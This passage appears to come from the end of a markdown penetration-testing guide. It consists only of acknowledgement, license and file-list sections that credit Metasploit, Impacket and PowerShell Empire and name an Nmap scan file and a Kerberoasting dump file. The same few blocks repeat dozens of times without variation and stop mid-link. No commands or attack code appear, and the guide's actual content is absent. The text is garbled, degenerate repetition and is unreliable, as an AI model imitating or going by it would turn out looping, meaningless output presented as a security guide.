- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.